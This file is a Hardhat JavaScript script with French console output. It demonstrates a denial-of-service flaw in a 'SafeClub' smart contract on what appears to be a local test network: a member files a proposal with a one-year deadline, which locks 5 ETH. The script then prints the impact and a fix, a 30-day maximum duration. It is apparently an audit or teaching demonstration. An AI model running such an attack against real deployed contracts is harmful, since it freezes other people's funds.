import pkg from 'hardhat';
const { ethers } = pkg;

async function main() {
    const [owner, member1] = await ethers.getSigners();
    const CONTRACT_ADDRESS = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
    const contract = await ethers.getContractAt("SafeClub", CONTRACT_ADDRESS);
    
    console.log("==========================================");
    console.log("🚨 DÉMONSTRATION : PROPOSITION DURÉE INFINIE");
    console.log("==========================================");
    
    console.log("\n📊 ÉTAT INITIAL :");
    const balance = await contract.getBalance();
    console.log(`Solde du contrat : ${ethers.formatEther(balance)} ETH`);
    
    console.log("\n==========================================");
    console.log("🚨 ATTAQUE : Proposition avec durée infinie");
    console.log("==========================================");
    
    const oneYear = 365 * 24 * 60 * 60; // 1 an en secondes
    const amount = ethers.parseEther("5");
    
    console.log(`\nCréation d'une proposition :`);
    console.log(`  Montant : ${ethers.formatEther(amount)} ETH`);
    console.log(`  Durée : 1 an (${oneYear} secondes)`);
    console.log(`  Bénéficiaire : ${owner.address}`);
    
    try {
        await contract.connect(member1).createProposal(
            owner.address,
            amount,
            "Proposition bloquée pour 1 an - Attaque DoS",
            oneYear
        );
        
        const proposalCount = await contract.nextProposalId();
        const proposalId = proposalCount - 1n;
        const proposal = await contract.getProposal(proposalId);
        
        const currentTime = await ethers.provider.getBlock("latest").then(b => b.timestamp);
        const deadline = Number(proposal.deadline);
        const daysUntilDeadline = Math.floor((deadline - currentTime) / (24 * 60 * 60));
        const deadlineDate = new Date(deadline * 1000);
        
        console.log(`\n✅ Proposition créée avec succès !`);
        console.log(`\n📊 Détails de la proposition :`);
        console.log(`  ID : ${proposalId}`);
        console.log(`  Montant : ${ethers.formatEther(proposal.amount)} ETH`);
        console.log(`  Deadline : ${daysUntilDeadline} jours`);
        console.log(`  Date limite : ${deadlineDate.toLocaleString()}`);
        console.log(`  Description : ${proposal.description}`);
        
        console.log("\n==========================================");
        console.log("⚠️  IMPACT DE L'ATTAQUE :");
        console.log("==========================================");
        console.log(`❌ ${ethers.formatEther(amount)} ETH sont bloqués pendant 1 an`);
        console.log("❌ Impossible d'exécuter avant la deadline");
        console.log("❌ Fonds inutilisables pour le club");
        console.log("❌ Attaque DoS sur les fonds");
        console.log("\n💡 SOLUTION : Limiter la durée maximale");
        console.log("   (Ex: maximum 30 jours)");
        console.log("==========================================");
        
    } catch (error) {
        if (error.message.includes("Solde insuffisant")) {
            console.log("\n❌ Erreur : Solde insuffisant");
            console.log("💡 Financez d'abord le contrat avec au moins 5 ETH");
        } else {
            console.log("\n❌ Erreur :", error.message);
        }
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
